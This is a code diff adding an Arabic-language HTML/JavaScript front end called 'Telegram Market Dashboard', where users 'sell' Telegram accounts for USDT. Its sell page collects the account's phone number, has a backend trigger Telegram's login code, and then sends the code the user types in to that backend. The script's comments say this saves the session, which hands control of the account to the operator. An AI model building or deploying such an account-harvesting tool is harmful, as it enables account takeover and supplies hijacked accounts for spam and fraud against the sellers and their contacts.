@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Market Dashboard</title>
+    <style>
+        :root {
+            --main-bg: #f8f9fa;
+            --telegram-blue: #2481cc;
+            --gold-gradient: linear-gradient(45deg, #d4af37, #f9e27d);
+            --card-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--main-bg);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .app-shell {
+            width: 100%;
+            max-width: 480px;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header Area */
+        .user-header {
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .avatar {
+            width: 55px;
+            height: 55px;
+            border-radius: 50%;
+            background: #ddd url('https://via.placeholder.com/150') center/cover;
+        }
+
+        .user-meta h4 { margin: 0; font-size: 17px; color: #333; }
+        .user-meta p { margin: 0; font-size: 13px; color: #777; }
+
+        /* Menu List */
+        .menu-container { flex: 1; padding: 10px 0; }
+
+        .menu-item {
+            display: flex;
+            align-items: center;
+            padding: 15px 20px;
+            cursor: pointer;
+            transition: 0.2s;
+            border-bottom: 1px solid #f9f9f9;
+        }
+
+        .menu-item:active { background: #f0f0f0; }
+
+        .icon-circle {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            margin-left: 15px;
+            font-size: 18px;
+        }
+
+        .item-info { flex: 1; }
+        .item-info span { display: block; font-weight: 600; color: #444; }
+        .item-info small { color: #888; font-size: 12px; }
+
+        .badge {
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: bold;
+        }
+
+        /* Tabs System */
+        .tabs-header {
+            display: flex;
+            background: white;
+            position: sticky;
+            top: 0;
+            border-bottom: 2px solid #eee;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            background: none;
+            font-weight: bold;
+            color: #888;
+            cursor: pointer;
+        }
+
+        .tab-btn.active {
+            color: var(--telegram-blue);
+            border-bottom: 2px solid var(--telegram-blue);
+        }
+
+        /* Pages */
+        .page { display: none; }
+        .page.active { display: block; }
+
+        /* Inputs & Buttons */
+        .input-group { padding: 20px; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+
+        .gold-btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            background: var(--gold-gradient);
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(212, 175, 55, 0.3);
+        }
+
+        .back-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: var(--telegram-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-shell">
+    
+    <div id="homePage" class="page active">
+        <div class="user-header">
+            <div class="avatar"></div>
+            <div class="user-meta">
+                <h4 id="userName">المستخدم</h4>
+                <p id="userPhone">+249...</p>
+            </div>
+        </div>
+
+        <div class="menu-container">
+            <div class="menu-item">
+                <div class="icon-circle" style="background: #4caf50;">$</div>
+                <div class="item-info">
+                    <span>Withdraw Money</span>
+                    <small id="balanceText">0.00 USDT</small>
+                </div>
+            </div>
+
+            <div class="menu-item" onclick="showPage('sellPage')">
+                <div class="icon-circle" style="background: var(--telegram-blue);">TG</div>
+                <div class="item-info">
+                    <span>Sell Account</span>
+                    <small id="salesText">0</small>
+                </div>
+                <span class="badge">AVAILABLE</span>
+            </div>
+
+            <div class="menu-item" onclick="showPage('ordersPage')">
+                <div class="icon-circle" style="background: #f44336;">📋</div>
+                <div class="item-info">
+                    <span>Orders</span>
+                    <small>عرض الطلبات السابقة</small>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="sellPage" class="page">
+        <div style="padding: 20px;">
+            <h3>بيع حساب تيليجرام</h3>
+            <div id="step1">
+                <p style="font-size: 14px; color: #666;">أدخل رقم الهاتف المرتبط بالحساب:</p>
+                <input type="text" id="phoneInput" placeholder="+249123456789">
+                <button class="gold-btn" onclick="apiSendCode()">إرسال كود التحقق</button>
+            </div>
+
+            <div id="step2" style="display:none;">
+                <p style="font-size: 14px; color: #666;">أدخل الكود الذي وصلك في تيليجرام:</p>
+                <input type="text" id="otpInput" placeholder="12345">
+                <button class="gold-btn" onclick="apiVerifyCode()" style="background: var(--telegram-blue); color: white;">تأكيد البيع</button>
+            </div>
+            <p id="statusMsg" style="text-align: center; font-size: 13px; margin-top: 15px;"></p>
+            <a href="#" class="back-link" onclick="showPage('homePage')">رجوع للرئيسية</a>
+        </div>
+    </div>
+
+    <div id="ordersPage" class="page">
+        <div class="tabs-header">
+            <button class="tab-btn active" onclick="switchTab(this, 'pending')">Pending</button>
+            <button class="tab-btn" onclick="switchTab(this, 'accepted')">Accepted</button>
+            <button class="tab-btn" onclick="switchTab(this, 'rejected')">Rejected</button>
+        </div>
+        <div id="tabContent" style="padding: 10px;">
+            <p style="text-align: center; color: #999; margin-top: 50px;">جاري تحميل البيانات...</p>
+        </div>
+        <a href="#" class="back-link" onclick="showPage('homePage')">رجوع للرئيسية</a>
+    </div>
+
+</div>
+
+<script>
+    const API_URL = "http://localhost:5000"; // غيره لعنوان سيرفرك عند النشر
+    let currentHash = "";
+    let userPhone = "";
+
+    // 1. التنقل بين الصفحات
+    function showPage(pageId) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(pageId).classList.add('active');
+        if(pageId === 'homePage') updateStats();
+    }
+
+    // 2. تحديث الرصيد والمبيعات من السيرفر
+    async function updateStats() {
+        try {
+            const res = await fetch(`${API_URL}/get_stats`);
+            const data = await res.json();
+            document.getElementById('balanceText').innerText = data.balance.toFixed(2) + " USDT";
+            document.getElementById('salesText').innerText = data.sales;
+        } catch (e) { console.log("السيرفر غير متصل"); }
+    }
+
+    // 3. إرسال طلب الكود
+    async function apiSendCode() {
+        userPhone = document.getElementById('phoneInput').value;
+        const msg = document.getElementById('statusMsg');
+        msg.innerText = "جاري الاتصال بتيليجرام...";
+
+        try {
+            const res = await fetch(`${API_URL}/send_code`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: userPhone })
+            });
+            const data = await res.json();
+            if(data.status === "success") {
+                currentHash = data.hash;
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+                msg.innerText = "تم إرسال الكود!";
+            } else {
+                msg.innerText = "خطأ: " + data.message;
+            }
+        } catch (e) { msg.innerText = "فشل الاتصال بالسيرفر."; }
+    }
+
+    // 4. التحقق من الكود وحفظ الجلسة
+    async function apiVerifyCode() {
+        const code = document.getElementById('otpInput').value;
+        const msg = document.getElementById('statusMsg');
+        
+        try {
+            const res = await fetch(`${API_URL}/verify_code`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: userPhone, code: code, hash: currentHash })
+            });
+            const data = await res.json();
+            if(data.status === "success") {
+                alert("تم استلام الحساب بنجاح!");
+                showPage('homePage');
+            } else {
+                alert("الكود غير صحيح.");
+            }
+        } catch (e) { alert("حدث خطأ في الاتصال."); }
+    }
+
+    // 5. نظام التبويبات (Tabs)
+    function switchTab(btn, type) {
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        
+        const content = document.getElementById('tabContent');
+        if(type === 'pending') {
+            content.innerHTML = `<div class="menu-item">
+                <div class="item-info"><span>${userPhone || 'لا توجد طلبات'}</span><small>0.45 USDT</small></div>
+                <div style="text-align:right"><span class="badge" style="background:#e3f2fd">FREE</span></div>
+            </div>`;
+        } else {
+            content.innerHTML = `<p style="text-align:center; color:#999; margin-top:50px;">لا توجد بيانات حالياً</p>`;
+        }
+    }
+
+    // تشغيل التحديث عند الفتح
+    window.onload = updateStats;
+</script>
+
+</body>
+</html>
